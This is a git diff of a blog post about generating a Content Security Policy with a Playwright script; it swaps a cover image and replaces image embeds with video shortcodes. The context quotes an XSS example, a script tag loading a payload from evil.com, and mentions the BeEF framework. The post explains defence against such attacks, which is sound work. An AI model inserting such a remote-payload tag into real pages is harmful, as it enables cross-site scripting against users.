@@ -25,7 +25,7 @@ ShowReadingTime: false
 ShowBreadCrumbs: false
 ShowPostNavLinks: false
 cover:
-    image: "/posts/csp/csp.gif" # image path/url
+    image: "/posts/csp/csp.png" # image path/url
     alt: "Generating a CSP using a playwright script" # alt text
     caption: "" # display caption under cover
     relative: false # when using page bundles set this to true
@@ -41,6 +41,7 @@ One of the mitigating defenses for [XSS attacks](https://portswigger.net/web-sec
 ```js
 <script src="https://evil.com/payload.js"/>
 ```
+
 the entire payload must be encoded in the script evaluation window, effectively preventing nasty frameworks like [BeEF](https://beefproject.com/) from being loaded.
 
 
@@ -177,8 +178,8 @@ When the browser loads, click on the extension icon and start a new recording.
 
 Then, press enter to start recursively visiting all the URLs with the script.
 
-![Fast Typing](./fast_typing.gif)
-![Quick CSP Demo](./csp.webm)
+{{< video src="fast_typing.av1.mp4" autoplay=true loop=true >}}
+{{< video src="csp.av1.mp4" autoplay=true loop=true >}}
 
 Be mindful of being banned if there is an anti-bot service running on the site. Set a delay between page loads if necessary.
 
